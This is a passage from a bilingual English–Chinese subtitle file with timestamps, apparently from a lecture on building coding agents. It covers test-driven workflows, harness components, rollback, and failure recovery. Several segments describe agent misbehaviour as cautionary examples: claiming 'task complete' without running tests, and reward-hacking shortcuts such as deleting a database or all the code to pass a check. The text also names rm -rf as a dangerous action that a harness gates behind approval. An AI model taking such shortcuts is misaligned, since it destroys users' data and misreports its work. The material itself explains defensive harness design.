    "zh": "完成设计文档后，智能体应提交给用户审核，并在获得批准后再继续执行。"
  },
  {
    "id": 111,
    "start": 1012.385,
    "end": 1015.11,
    "en": "Code Implementation and Testing.",
    "zh": "代码实现与测试。"
  },
  {
    "id": 112,
    "start": 1015.11,
    "end": 1028.748,
    "en": "After obtaining design approval, the Agent follows the project's code conventions for implementation, reuses existing abstractions and tools, and performs moderate refactoring when necessary to maintain the health of the codebase.",
    "zh": "在获得设计批准后，智能体按照项目的代码规范进行实现，重用现有的抽象和工具，并在必要时进行适度重构，以保持代码库的健康状态。"
  },
  {
    "id": 113,
    "start": 1028.748,
    "end": 1042.198,
    "en": "After implementation, the Agent immediately enters a test-driven quality assurance phase—writing test cases for the new or modified functionality, covering normal paths, boundary conditions, and error scenarios.",
    "zh": "实现之后，智能体立即进入以测试驱动的质量保证阶段——为新功能或修改的功能编写测试用例，覆盖正常路径、边界条件和错误场景。"
  },
  {
    "id": 114,
    "start": 1042.198,
    "end": 1046.573,
    "en": "After writing the tests, the Agent executes the test suite.",
    "zh": "编写完测试用例后，智能体执行测试套件。"
  },
  {
    "id": 115,
    "start": 1046.573,
    "end": 1057.06,
    "en": "If tests fail, the Agent should not simply report the failure to the user but should analyze the cause, locate the problem, and modify the code until all tests pass.",
    "zh": "如果测试失败，智能体不应只是将失败报告给用户，而应分析原因、定位问题，并修改代码直到所有测试通过。"
  },
  {
    "id": 116,
    "start": 1057.06,
    "end": 1067.76,
    "en": "This \"test-fix\" loop may require several iterations, and it is this self-correcting ability that elevates a Coding Agent from a code generator to a reliable engineering assistant.",
    "zh": "这个“测试-修复”循环可能需要多次迭代，正是这种自我纠正能力，使代码智能体从代码生成器提升为可靠的工程助手。"
  },
  {
    "id": 117,
    "start": 1067.76,
    "end": 1078.185,
    "en": "Conversely, the most common way a Coding Agent slacks off is to skip this stage entirely—writing the code and reporting \"task complete\" without ever running the tests.",
    "zh": "相反，代码智能体偷懒最常见的方法就是完全跳过这一阶段——编写代码后报告“任务完成”，却从未运行测试。"
  },
  {
    "id": 118,
    "start": 1078.185,
    "end": 1089.973,
    "en": "Defining \"tests pass,\" rather than \"code written,\" as the completion criterion is precisely Loop Engineering's principle of letting verification decide when it is safe to stop, applied to coding.",
    "zh": "将“测试通过”而非“代码编写”作为完成标准，正是循环工程原则的体现，即让验证决定何时可以安全停止，应用于代码编写中。"
  },
  {
    "id": 119,
    "start": 1089.973,
    "end": 1094.185,
    "en": "Even if all tests pass, the Agent's work is not done.",
    "zh": "即使所有测试都通过了，智能体的工作仍未完成。"
  },
  {
    "id": 120,
    "start": 1094.185,
    "end": 1099.985,
    "en": "The next phase is code review: the Agent critically examines its own generated code.",
    "zh": "下一阶段是代码审查：智能体对其生成的代码进行批判性检查。"
  },
  {
    "id": 121,
    "start": 1099.985,
    "end": 1102.96,
    "en": "Is it readable and adequately commented?",
    "zh": "是否可读且注释充分？"
  },
  {
    "id": 122,
    "start": 1102.96,
    "end": 1107.185,
    "en": "Are there lurking performance problems or security vulnerabilities?",
    "zh": "是否存在潜在的性能问题或安全漏洞？"
  },
  {
    "id": 123,
    "start": 1107.185,
    "end": 1111.285,
    "en": "Does it follow the project's code style and best practices?",
    "zh": "是否遵循了项目的代码风格和最佳实践？"
  },
  {
    "id": 124,
    "start": 1111.285,
    "end": 1118.56,
    "en": "This self-review can be done by reading the code, running lint tools, or calling a dedicated code review sub-agent.",
    "zh": "此自我审查可以通过阅读代码、运行lint工具或调用专门的代码审查子智能体来完成。"
  },
  {
    "id": 125,
    "start": 1118.56,
    "end": 1126.935,
    "en": "If the review finds issues, the Agent should return to the modification phase and fix them, rather than delivering flawed code to the user.",
    "zh": "如果审查发现存在问题，智能体应返回修改阶段进行修复，而不是将有缺陷的代码交付给用户。"
  },
  {
    "id": 126,
    "start": 1126.935,
    "end": 1130.348,
    "en": "Documentation Synchronization and Delivery.",
    "zh": "文档同步与交付。"
  },
  {
    "id": 127,
    "start": 1130.5,
    "end": 1145.15,
    "en": "If the code changes involve architectural changes—such as introducing a new module, changing dependencies between modules, or altering the semantics of core abstractions—the Agent needs to update the architecture documentation accordingly.",
    "zh": "如果代码更改涉及架构变更——例如引入新模块、改变模块间的依赖关系或修改核心抽象的语义——智能体需要相应地更新架构文档。"
  },
  {
    "id": 128,
    "start": 1145.1,
    "end": 1151.137,
    "en": "Outdated documentation is worse than no documentation because it misleads future developers.",
    "zh": "过时的文档比没有文档更糟糕，因为它会误导未来的开发人员。"
  },
  {
    "id": 129,
    "start": 1151.137,
    "end": 1160.625,
    "en": "By automatically updating documentation after every significant change, the Agent helps maintain the integrity and timeliness of the project's knowledge base.",
    "zh": "通过在每次重大更改后自动更新文档，智能体有助于保持项目知识库的完整性和时效性。"
  },
  {
    "id": 130,
    "start": 1160.625,
    "end": 1171.2,
    "en": "This workflow embodies the core principles of software engineering: planning precedes action, verification runs throughout, and documentation evolves together with the code.",
    "zh": "这个工作流程体现了软件工程的核心原则：规划先于行动，验证贯穿始终，文档随代码同步演进。"
  },
  {
    "id": 131,
    "start": 1171.2,
    "end": 1176.075,
    "en": "Note that the process described above is a recommended engineering workflow.",
    "zh": "请注意，上述过程是一个推荐的工程工作流程。"
  },
  {
    "id": 132,
    "start": 1176.075,
    "end": 1189.575,
    "en": "Real-world Coding Agents (such as Claude Code and Codex) trim it as needed: a simple bug-fix task skips generating a design document, while only complex, wide-reaching tasks go through every stage in full.",
    "zh": "现实中的代码智能体（如Claude Code和Codex）会根据需要进行精简：一个简单的修复任务可能跳过生成设计文档，而只有复杂且影响范围广的任务才会完整地经过每个阶段。"
  },
  {
    "id": 133,
    "start": 1189.575,
    "end": 1193.225,
    "en": "Different models trim this workflow in different ways.",
    "zh": "不同的模型以不同方式精简此工作流程。"
  },
  {
    "id": 134,
    "start": 1193.225,
    "end": 1201.025,
    "en": "Some Coding models read the repository structure, implementation, callers, and tests broadly before the first edit.",
    "zh": "一些代码模型在首次编辑前广泛阅读仓库结构、实现、调用者和测试。"
  },
  {
    "id": 135,
    "start": 1201.025,
    "end": 1209.962,
    "en": "Others inspect only the few files most likely to matter, make an early patch, and treat compiler and test feedback as part of the investigation.",
    "zh": "其他模型仅检查最可能相关的少数文件，生成早期补丁，并将编译器和测试反馈视为调查的一部分。"
  },
  {
    "id": 136,
    "start": 1209.962,
    "end": 1221.162,
    "en": "This threshold for deciding when to stop gathering information and start acting can continue to follow the model after the harness changes, and can change when the model is swapped inside the same harness.",
    "zh": "决定何时停止收集信息并开始行动的这一阈值可以在Harness发生变化后继续遵循模型，并且在同一个Harness内更换模型时也可以改变。"
  },
  {
    "id": 137,
    "start": 1221.162,
    "end": 1227.9,
    "en": "It is therefore first and foremost a learned model behavior, not merely the interface style of a Coding product.",
    "zh": "因此，这首先是学习到的模型行为，而不仅仅是编码产品的界面风格。"
  },
  {
    "id": 138,
    "start": 1227.9,
    "end": 1235.112,
    "en": "Prompts, tools, and budgets in the harness can still amplify or suppress it, but need not be its source.",
    "zh": "Harness中的提示、工具和预算仍可以放大或抑制它，但不一定是它的来源。"
  },
  {
    "id": 139,
    "start": 1235.112,
    "end": 1243.65,
    "en": "Chapter 7 measures this difference in a fixed harness; Chapter 8 then explains how post-training may write such a policy into the parameters.",
    "zh": "第7章在固定Harness中衡量这一差异；第8章则解释了训练后如何将这种策略写入参数中。"
  },
  {
    "id": 140,
    "start": 1243.65,
    "end": 1247.225,
    "en": "Harness Engineering in Practice for Coding Agents.",
    "zh": "代码智能体的实践中的Harness工程。"
  },
  {
    "id": 141,
    "start": 1247.225,
    "end": 1253.787,
    "en": "Chapter 1 introduced the concept of Harness Engineering and the formula Agent = Model + Harness.",
    "zh": "第1章介绍了Harness工程的概念以及公式：智能体 = 模型 + Harness。"
  },
  {
    "id": 142,
    "start": 1253.787,
    "end": 1266.275,
    "en": "The Harness here includes the context and tools from the core formula, as well as constraints, verification, and correction mechanisms—these five elements together constitute the Harness defined in Chapter 1.",
    "zh": "这里的Harness包括核心公式中的上下文和工具，以及约束、验证和修正机制——这五个要素共同构成了第1章定义的Harness。"
  },
  {
    "id": 143,
    "start": 1266.275,
    "end": 1279.8,
    "en": "Coding Agents are perhaps the domain where Harness Engineering pays off most—code writing is the most verifiable of all Agent tasks, and its constraints, verification, and correction can all lean on existing infrastructure.",
    "zh": "代码智能体可能是Harness工程最见效的领域——代码编写是所有智能体任务中最易验证的，其约束、验证和修正都可以依赖现有基础设施。"
  },
  {
    "id": 144,
    "start": 1279.8,
    "end": 1284.662,
    "en": "This section focuses on concrete practice in the Coding Agent scenario.",
    "zh": "本节专注于代码智能体场景中的具体实践。"
  },
  {
    "id": 145,
    "start": 1284.662,
    "end": 1292.675,
    "en": "Whether a system runs stably often depends less on the power of the model and more on the robustness of the infrastructure built around the Agent.",
    "zh": "系统是否稳定往往更多取决于围绕智能体构建的基础设施的稳健性，而非模型的性能。"
  },
  {
    "id": 146,
    "start": 1292.675,
    "end": 1304.937,
    "en": "Chapter 1 divides the Harness into two layers—Context and Tools (enabling the Agent to act) and Constraints, Verification, and Correction (helping the Agent act safely and correctly).",
    "zh": "第1章将Harness分为两层——上下文和工具（使智能体能够行动）以及约束、验证和修正（帮助智能体安全且正确地行动）。"
  },
  {
    "id": 147,
    "start": 1304.937,
    "end": 1310.525,
    "en": "In the Coding Agent scenario, these translate into specific engineering components:",
    "zh": "在代码智能体场景中，这些转化为具体的工程组件："
  },
  {
    "id": 148,
    "start": 1310.525,
    "end": 1323.687,
    "en": "Acceptance Baseline: What constitutes \"done\"—test suites, CI pipeline (Continuous Integration pipeline, a series of checks automatically run after code submission), code review standards",
    "zh": "接受基准：什么是“完成”——测试套件、CI流水线（持续集成流水线，在代码提交后自动运行的一系列检查）、代码审查标准"
  },
  {
    "id": 149,
    "start": 1323.687,
    "end": 1332.05,
    "en": "Execution Boundary: What the Agent can and cannot touch—module boundaries, dependency rules, permission controls",
    "zh": "执行边界：智能体可以或不可以接触的内容——模块边界、依赖规则、权限控制"
  },
  {
    "id": 150,
    "start": 1332.05,
    "end": 1344.762,
    "en": "Feedback Signals: Automated correctness judgments—Linter (code style checking tool that can automatically find formatting errors and potential issues) output, test results, type checking errors",
    "zh": "反馈信号：自动化正确性判断——Linter（可以自动发现格式错误和潜在问题的代码风格检查工具）输出、测试结果、类型检查错误"
  },
  {
    "id": 151,
    "start": 1344.762,
    "end": 1353.637,
    "en": "Rollback Mechanism: How to recover if something goes wrong—Git version control, sandbox isolation, snapshot rollback",
    "zh": "回滚机制：如果出现问题如何恢复——Git版本控制、沙箱隔离、快照回滚"
  },
  {
    "id": 152,
    "start": 1353.637,
    "end": 1358.125,
    "en": "Why Coding Agents Are Particularly Suitable for Harness Engineering.",
    "zh": "为什么代码智能体特别适合Harness工程"
  },
  {
    "id": 153,
    "start": 1358.284,
    "end": 1366.246,
    "en": "Two dimensions — how clear the goal is, and how automated the verification is — divide tasks into four states.",
    "zh": "两个维度——目标是否清晰，验证是否自动化——将任务划分为四种状态"
  },
  {
    "id": 154,
    "start": 1366.196,
    "end": 1384.809,
    "en": "A clear goal with automatically verifiable results is the territory where Agents thrive; a clear goal whose acceptance still depends on human eyes caps throughput at the speed of human review; automated feedback with a vague goal lets the system run efficiently in the wrong direction; lacking both, the Agent is of little use.",
    "zh": "目标清晰且结果可自动验证是智能体发挥优势的领域；目标清晰但仍需人工审核会限制吞吐量，使其速度受限于人工审查；自动化反馈但目标模糊会让系统高效地走向错误方向；两者都缺乏的话，智能体就几乎无用"
  },
  {
    "id": 155,
    "start": 1384.809,
    "end": 1388.446,
    "en": "Table 5-1 shows these four states.",
    "zh": "表5-1展示了这四种状态"
  },
  {
    "id": 156,
    "start": 1388.446,
    "end": 1396.159,
    "en": "The goal of the Harness is to push as many tasks as possible into the \"clear goal + automated verification\" quadrant.",
    "zh": "Harness的目标是将尽可能多的任务推入“目标清晰+自动化验证”的象限"
  },
  {
    "id": 157,
    "start": 1396.159,
    "end": 1401.721,
    "en": "Table 5-1 Four Quadrants of Task Clarity and Verification Automation",
    "zh": "表5-1 任务清晰度与验证自动化四个象限"
  },
  {
    "id": 158,
    "start": 1401.721,
    "end": 1413.884,
    "en": "Results can be automatically verified: Sweet spot: fixing bugs with test cases; Results require manual verification: Throughput-limited: code refactoring requires manual review.",
    "zh": "结果可自动验证：最佳区域：通过测试用例修复bug；结果需要手动验证：吞吐量受限：代码重构需要人工审查"
  },
  {
    "id": 159,
    "start": 1413.884,
    "end": 1426.609,
    "en": "Results can be automatically verified: Efficiently going off track: optimizing \"code quality\" with a linter; Results require manual verification: Hard to start: \"make the UI look better\".",
    "zh": "结果可自动验证：高效偏离正轨：通过静态检查器优化“代码质量”；结果需要手动验证：难以启动：“让UI更好看”"
  },
  {
    "id": 160,
    "start": 1426.609,
    "end": 1443.459,
    "en": "Code-writing tasks naturally occupy the \"clear goal + automated verification\" quadrant—test suites provide clear acceptance criteria, linters and type checkers offer instant automated verification, and Git provides perfect version control and rollback capabilities.",
    "zh": "代码编写任务自然位于“目标清晰+自动化验证”的象限——测试套件提供明确的验收标准，静态检查器和类型检查器提供即时的自动化验证，Git提供完美的版本控制和回滚能力"
  },
  {
    "id": 161,
    "start": 1443.459,
    "end": 1457.696,
    "en": "This explains why Coding Agents are currently the most mature among all Agent types: not because code generation models are particularly powerful, but because decades of software engineering infrastructure naturally constitute a robust Harness.",
    "zh": "这解释了为什么代码智能体目前是所有智能体类型中最成熟的：不是因为代码生成模型特别强大，而是因为数十年的软件工程基础设施自然构成了一个强大的Harness"
  },
  {
    "id": 162,
    "start": 1457.696,
    "end": 1459.834,
    "en": "Industry Practice.",
    "zh": "行业实践"
  },
  {
    "id": 163,
    "start": 1459.834,
    "end": 1464.359,
    "en": "Three case studies of Harness practice confirm the above principles:",
    "zh": "三个Harness实践案例验证了上述原则："
  },
  {
    "id": 164,
    "start": 1464.359,
    "end": 1488.971,
    "en": "Large-scale code migration case (from a large tech company's publicly shared large-scale code migration practice): The key was not the model's strength, but the Harness doing three things right—knowledge must exist within the codebase itself (what the Agent cannot see does not exist), constraints are encoded into linters and CI rather than written in documentation, and verification and correction are fully automated end-to-end.",
    "zh": "大规模代码迁移案例（来自一家大型科技公司公开分享的大规模代码迁移实践）：关键不在于模型的能力，而在于Harness做对了三件事——知识必须存在于代码库本身中（智能体看不到的内容就不存在），约束应编码到静态检查器和CI中，而不是写在文档中，验证和修正应实现端到端的自动化"
  },
  {
    "id": 165,
    "start": 1488.971,
    "end": 1499.284,
    "en": "LangChain: Significantly improved benchmark task performance solely by optimizing the Harness (system prompts, tool middleware, self-verification loops).",
    "zh": "LangChain：仅通过优化Harness（系统提示、工具中间件、自我验证循环）显著提升了基准任务性能"
  },
  {
    "id": 166,
    "start": 1499.284,
    "end": 1510.309,
    "en": "Particularly noteworthy is the methodology of \"using an Agent to analyze failure trajectories to improve the Harness,\" shifting Harness engineering from experience-driven to data-driven.",
    "zh": "特别值得注意的是“使用智能体分析失败轨迹以改进Harness”的方法，将Harness工程从经验驱动转变为数据驱动。"
  },
  {
    "id": 167,
    "start": 1510.309,
    "end": 1529.934,
    "en": "Anthropic: Splits long tasks into two roles—an initialization Agent responsible for breaking down large tasks into a task list, and an execution Agent responsible for progressing step by step, leaving intermediate results (such as completed code files and updated task lists) for the next round to continue using.",
    "zh": "Anthropic：将长时间任务拆分为两个角色——初始化智能体负责将大任务分解为任务列表，执行智能体负责逐步推进，并为下一轮保留中间结果（如已完成的代码文件和更新后的任务列表）。"
  },
  {
    "id": 168,
    "start": 1529.934,
    "end": 1537.984,
    "en": "This division of labor solves the problem of long-running Agents \"trying to do too much at once\" or \"claiming completion prematurely.",
    "zh": "这种分工解决了长期运行的智能体“一次性做太多事”或“过早声称完成”的问题。"
  },
  {
    "id": 169,
    "start": 1537.984,
    "end": 1541.946,
    "en": "From Coding Agent to General Harness Design Principles.",
    "zh": "从代码智能体到通用Harness设计原则。"
  },
  {
    "id": 170,
    "start": 1541.946,
    "end": 1548.496,
    "en": "The Harness practices of Coding Agents provide transferable design principles for all Agent systems:",
    "zh": "代码智能体的Harness实践为所有智能体系统提供了可迁移的设计原则："
  },
  {
    "id": 171,
    "start": 1548.496,
    "end": 1556.146,
    "en": "Constraints over guidance: Rules that can be enforced with code should be encoded there, not merely suggested in documentation.",
    "zh": "约束优于指导：可以用代码实现的规则应编码在其中，而不是仅仅在文档中建议。"
  },
  {
    "id": 172,
    "start": 1556.146,
    "end": 1562.684,
    "en": "The value of linter rules, type constraints, and CI checks far exceeds \"please follow...",
    "zh": "lint规则、类型约束和CI检查的价值远超过“请遵循……”"
  },
  {
    "id": 173,
    "start": 1562.684,
    "end": 1569.871,
    "en": "guidance in system prompts—the former means \"cannot be done,\" the latter is merely \"advised against.",
    "zh": "系统提示中的指导——前者意味着“不能做”，后者只是“建议不要做”。"
  },
  {
    "id": 174,
    "start": 1569.871,
    "end": 1574.796,
    "en": "Automate verification: Manual review is an unscalable bottleneck.",
    "zh": "自动化验证：手动审查是不可扩展的瓶颈。"
  },
  {
    "id": 175,
    "start": 1574.796,
    "end": 1582.984,
    "en": "Investment in test suites, code quality checks, and behavior monitoring yields far higher returns than adding more human effort.",
    "zh": "对测试套件、代码质量检查和行为监控的投资，其回报远高于增加更多人力投入。"
  },
  {
    "id": 176,
    "start": 1582.984,
    "end": 1593.134,
    "en": "Feedback should be as fast and structured as possible: The more detailed the error message and the closer it is to the moment of error, the more efficiently the Agent can correct itself.",
    "zh": "反馈应尽可能快速且结构化：错误信息越详细，越接近错误发生的时刻，智能体就能更高效地自我修正。"
  },
  {
    "id": 177,
    "start": 1593.134,
    "end": 1601.271,
    "en": "The Agent status bar techniques from Chapter 2 (detailed error messages, tool call counters) embody this principle.",
    "zh": "第2章中智能体状态栏技术（详细的错误信息、工具调用计数器）体现了这一原则。"
  },
  {
    "id": 178,
    "start": 1601.271,
    "end": 1607.609,
    "en": "Rollback must be reliable: Agents can only experiment boldly when operating within a safety net.",
    "zh": "回滚必须可靠：智能体只有在有安全网的情况下才能大胆实验。"
  },
  {
    "id": 179,
    "start": 1607.609,
    "end": 1614.346,
    "en": "Git branches, sandbox environments, and snapshot mechanisms ensure any error is reversible.",
    "zh": "Git分支、沙盒环境和快照机制确保任何错误都可以撤销。"
  },
  {
    "id": 180,
    "start": 1614.508,
    "end": 1618.895,
    "en": "A deeper purpose of constraints: preventing process errors.",
    "zh": "约束的更深层目的：防止流程错误。"
  },
  {
    "id": 181,
    "start": 1618.845,
    "end": 1628.583,
    "en": "The acceptance baseline governs whether the outcome is right; the execution boundary governs the process—even a correct outcome does not justify a wrong method.",
    "zh": "接受基准决定了结果是否正确；执行边界决定了过程——即使结果正确，也不能证明方法是正确的。"
  },
  {
    "id": 182,
    "start": 1628.583,
    "end": 1640.983,
    "en": "Deleting and rebuilding the database to \"fix\" a database fault does repair it, but the data is gone; deleting all the code to fix a compilation error does make compilation pass, but the implementation is gone.",
    "zh": "删除并重新建立数据库以‘修复’数据库故障确实能修复它，但数据会丢失；删除所有代码以修复编译错误确实能让编译通过，但实现会丢失。"
  },
  {
    "id": 183,
    "start": 1640.983,
    "end": 1655.108,
    "en": "Such destructive shortcuts always exist: even when restrictions are written into the final evaluation metrics, Agents often find ways around them—this is the everyday form of reward hacking (Chapter 8) in Agent tasks.",
    "zh": "这种破坏性的捷径总是存在的：即使限制被写入最终评估指标中，智能体通常仍能找到绕过它们的方法——这是智能体任务中日常的奖励黑客行为（第8章）的一种形式。"
  },
  {
    "id": 184,
    "start": 1655.108,
    "end": 1673.108,
    "en": "A production Harness therefore places dedicated checks and approvals on dangerous actions like rm -rf, deleting production data, or overwriting an unread file (semantic parsing in this chapter's security section, Sidecar review in Chapter 4), constraining actions, not merely outcomes.",
    "zh": "因此，生产环境中的Harness会在危险操作（如rm -rf、删除生产数据或覆盖未读文件）上设置专门的检查和审批（本章安全部分的语义解析，第4章的Sidecar审查），约束的是操作本身，而不仅仅是结果。"
  },
  {
    "id": 185,
    "start": 1673.108,
    "end": 1694.008,
    "en": "RLVP in Chapter 8 (Reinforcement Learning with Verified Penalty—\"reward the outcome, penalize the path\") answers the same question from the training side: beyond the final outcome reward, it penalizes verifiable violations along the path, internalizing \"no destructive means\" as the model's engineering common sense.",
    "zh": "第8章中的RLVP（验证惩罚的强化学习——“奖励结果，惩罚路径”）从训练的角度回答了同样的问题：除了最终结果的奖励外，它还会惩罚路径上的可验证违规行为，将“不使用破坏性手段”内化为模型的工程常识。"
  },
  {
    "id": 186,
    "start": 1694.008,
    "end": 1703.095,
    "en": "For an existing model, Harness guardrails are external constraints; for a trainable model, process penalties internalize the same constraints.",
    "zh": "对于现有模型，Harness的防护措施是外部约束；对于可训练模型，过程惩罚则内化了相同的约束。"
  },
  {
    "id": 187,
    "start": 1703.095,
    "end": 1705.183,
    "en": "The goal is the same.",
    "zh": "目标是一致的。"
  },
  {
    "id": 188,
    "start": 1705.183,
    "end": 1708.808,
    "en": "Tool Orchestration: Fault Boundary Control.",
    "zh": "工具编排：故障边界控制。"
  },
  {
    "id": 189,
    "start": 1708.808,
    "end": 1712.733,
    "en": "Mature Coding Agents support parallel tool calls.",
    "zh": "成熟的代码智能体支持并行工具调用。"
  },
  {
    "id": 190,
    "start": 1712.733,
    "end": 1721.195,
    "en": "The unique problem from the Harness perspective is how faults propagate: when one tool fails, which calls should be aborted and which should continue?",
    "zh": "从Harness的角度来看，唯一的问题是故障如何传播：当一个工具失败时，哪些调用应该中止，哪些应该继续？"
  },
  {
    "id": 191,
    "start": 1721.195,
    "end": 1728.37,
    "en": "The principle is that faults propagate only within the same batch of parallel calls, not up to the parent operation.",
    "zh": "原则是，故障仅在同一批并行调用内部传播，不会影响到父级操作。"
  },
  {
    "id": 192,
    "start": 1728.37,
    "end": 1738.633,
    "en": "When reading three files in parallel, for example, a missing file should cause only that call to fail; it should neither cancel the other two nor abort the entire task.",
    "zh": "例如，在并行读取三个文件时，缺失的文件只会导致该调用失败；它既不会取消其他两个调用，也不会中止整个任务。"
  },
  {
    "id": 193,
    "start": 1738.633,
    "end": 1746.17,
    "en": "This fine-grained fault boundary control avoids the fragile pattern of \"one command failure aborting the entire task.",
    "zh": "这种细粒度的故障边界控制避免了“一个命令失败就中止整个任务”的脆弱模式。"
  },
  {
    "id": 194,
    "start": 1746.17,
    "end": 1755.783,
    "en": "The specific mechanisms for parallel calls, streaming parsing, and cascading aborts are detailed in the \"Implementation Tips\" section of this chapter.",
    "zh": "并行调用、流式解析和级联中止的具体机制在本章的“实现技巧”部分中有详细说明。"
  },
  {
    "id": 195,
    "start": 1755.783,
    "end": 1758.32,
    "en": "Failure and Error Recovery.",
    "zh": "故障与错误恢复。"
  },
  {
    "id": 196,
    "start": 1758.32,
    "end": 1769.27,
    "en": "The previous section presented the principles and components of Harness engineering; this section dives into the piece that most differentiates engineering maturity—failure and error recovery.",
    "zh": "上一节介绍了Harness工程的原则和组件；本节将深入探讨最能体现工程成熟度的方面——故障和错误恢复。"
  },
  {
    "id": 197,
    "start": 1769.27,
    "end": 1783.42,
    "en": "The ablation experiment in Chapter 1 showed how severe the problem can be: missing a single piece of tool-result feedback is enough to trap an Agent in an infinite loop—and real production environments see far more diverse failures than any experiment.",
    "zh": "第1章的消融实验显示了问题的严重性：缺少一个工具结果反馈就足以让智能体陷入无限循环——而真实的生产环境中出现的故障要比任何实验中的情况都更加多样化。"
  },
  {
    "id": 198,
    "start": 1783.42,
    "end": 1789.82,
    "en": "This section systematically answers three questions: What failures does a production Harness encounter?",
    "zh": "本节系统性地回答三个问题：生产环境中的Harness会遇到哪些失败？"
  },
  {
    "id": 199,
    "start": 1789.82,
    "end": 1792.583,
    "en": "How are they detected and recovered from?",
    "zh": "它们是如何被检测和恢复的？"
  },
  {
    "id": 200,
    "start": 1792.583,
    "end": 1795.133,
    "en": "And when must the system terminate?",
    "zh": "而系统何时必须终止？"
  },
  {
    "id": 201,
    "start": 1795.133,
    "end": 1798.695,
    "en": "A taxonomy of failures: four layers.",
    "zh": "失败的分类：四个层次。"
  },
  {
    "id": 202,
    "start": 1798.695,
    "end": 1802.945,
    "en": "The first step toward a systematic response is classification.",
    "zh": "系统化响应的第一步是分类。"
  },
  {
    "id": 203,
    "start": 1802.945,
    "end": 1806.883,
    "en": "Failures fall into four layers according to where they occur:",
    "zh": "故障根据发生的位置可以分为四个层次："
  },
  {
    "id": 204,
    "start": 1807.036,
    "end": 1818.236,
    "en": "API layer: rate limiting (HTTP 429), service overload, request timeouts, connection drops, and output truncated at the token limit.",
    "zh": "API层：速率限制（HTTP 429）、服务过载、请求超时、连接中断，以及输出在标记限制处被截断。"
  },
  {
    "id": 205,
    "start": 1818.186,
    "end": 1823.598,
    "en": "These failures are unrelated to the task itself—they are infrastructure noise.",
    "zh": "这些失败与任务本身无关，它们是基础设施的噪声。"
  },
  {
    "id": 206,
    "start": 1823.598,
    "end": 1840.223,
    "en": "Tool layer: hallucinated calls (invoking a tool that does not exist), malformed arguments (violating the tool's input contract), execution exceptions, and the most dangerous kind—a tool repeatedly returning the same error while the model retries it unchanged.",
    "zh": "工具层：幻觉调用（调用不存在的工具）、参数格式错误（违反工具的输入协议）、执行异常，以及最危险的一种情况——工具反复返回相同错误，而模型却不断重复尝试。"
  },
  {
    "id": 207,
    "start": 1840.223,
    "end": 1850.286,
    "en": "Context layer: context window overflow, compaction failure, and corrupted trajectory structure (such as a tool call missing its paired result message).",
    "zh": "上下文层：上下文窗口溢出、压缩失败以及轨迹结构损坏（例如工具调用缺少对应的返回消息）。"
  },
  {
    "id": 208,
    "start": 1850.286,
    "end": 1863.373,
    "en": "Control-flow layer: infinite loops (repeating the same operation with no progress) and death spirals (recovery logic triggered by an error itself calls the LLM, fails again, and cascades).",
    "zh": "控制流层：无限循环（重复相同操作但没有进展）和死亡螺旋（由错误触发的恢复逻辑本身调用大语言模型，再次失败并不断恶化）。"
  },
  {
    "id": 209,
    "start": 1863.373,
    "end": 1867.048,
    "en": "Detection: classify first, then count.",
    "zh": "检测：先分类，再计数。"
  },
  {
    "id": 210,
    "start": 1867.048,
    "end": 1873.611,
    "en": "When a failure occurs, the first question is not \"Should we retry?\" but \"Would retrying help?",
    "zh": "当出现故障时，第一个问题不是“我们应该重试吗？”，而是“重试会有帮助吗？”"
  },
  {
    "id": 211,
    "start": 1873.611,
    "end": 1892.111,
    "en": "Retryable errors (rate limiting, overload, network jitter) deserve retries; non-retryable errors (invalid arguments, insufficient permissions, nonexistent tool) will produce the same result no matter how many times they are retried as-is—the input or strategy must change.",
    "zh": "可重试错误（如速率限制、过载、网络抖动）应进行重试；不可重试错误（如无效参数、权限不足、不存在的工具）无论重试多少次都会产生相同结果，因此必须改变输入或策略。"
  },
  {
    "id": 212,
    "start": 1892.111,
    "end": 1899.661,
    "en": "A production Harness maintains a mapping from error types to recovery strategies, rather than a blanket \"retry on error.",
    "zh": "生产环境中的Harness会将错误类型映射到恢复策略，而不是简单地‘遇到错误就重试’。"
  },
  {
    "id": 213,
    "start": 1899.661,
    "end": 1903.398,
    "en": "Beyond individual errors, detect patterns.",
    "zh": "除了单个错误之外，还要检测模式。"
  },
  {
    "id": 214,
    "start": 1903.398,
    "end": 1918.948,
    "en": "First, repeated-call fingerprints: hash the \"tool name + arguments\" pair; the same fingerprint recurring is a clear signal of a no-progress loop—the Agent in Chapter 1's ablation experiment calling the same tool over and over was exactly this pattern.",
    "zh": "首先，重复调用指纹：对‘工具名称+参数’对进行哈希；相同的指纹反复出现表明存在无进展的循环——第1章消融实验中智能体不断调用同一工具的情况正是这种模式。"
  },
  {
    "id": 215,
    "start": 1918.948,
    "end": 1927.773,
    "en": "Second, consecutive-failure counters: each recovery path keeps its own counter, providing the basis for the circuit breakers discussed later.",
    "zh": "其次，连续失败计数器：每个恢复路径都有自己的计数器，为后续讨论的断路器提供基础。"
  },
  {
    "id": 216,
    "start": 1927.773,
    "end": 1935.273,
    "en": "A third class of failures does not manifest as errors at all and requires dedicated liveness and integrity monitoring.",
    "zh": "第三类故障根本不会表现为错误，需要专门的存活状态和完整性监控。"
  },
  {
    "id": 217,
    "start": 1935.273,
    "end": 1948.861,
    "en": "The most dangerous failure mode of a streaming connection is not a drop (which immediately produces an error) but a silent stall—the connection remains established, but the data flow stops, like a connected pipe that yields no water.",
    "zh": "流式连接最危险的故障模式不是断开（会立即产生错误），而是静默停滞——连接仍然建立，但数据流停止，就像一条连接但没有水流的管道。"
  },
  {
    "id": 218,
    "start": 1948.861,
    "end": 1967.398,
    "en": "SDK timeouts often cover only the initial connection, not the transfer process, so a production Agent needs an independent idle watchdog (a watchdog timer—if no new output arrives within a set interval, the connection is judged stalled) that kills the hung stream and triggers a retry upon timeout.",
    "zh": "SDK 超时通常只覆盖初始连接，而不包括传输过程，因此生产环境的智能体需要一个独立的空闲看门狗（看门狗定时器——如果在设定时间内没有新输出到达，连接会被判定为停滞）来终止卡住的流，并在超时时触发重试。"
  },
  {
    "id": 219,
    "start": 1967.398,
    "end": 1974.736,
    "en": "This generalizes into a principle: every long-lived connection needs a liveness signal, not just a connection timeout.",
    "zh": "这推广为一个原则：每个长期连接都需要一个存活信号，而不仅仅是连接超时。"
  },
  {
    "id": 220,
    "start": 1974.736,
    "end": 1988.336,
    "en": "Integrity monitoring targets trajectory structure: when a tool call is found to lack its paired result message, the system repairs the pairing before injecting the context, rather than throwing the structural anomaly at the model or the user.",
    "zh": "完整性监控针对轨迹结构：当发现工具调用缺少对应的返回消息时，系统会在注入上下文前修复配对，而不是将结构异常直接暴露给模型或用户。"
  },
  {
    "id": 221,
    "start": 1988.336,
    "end": 2004.173,
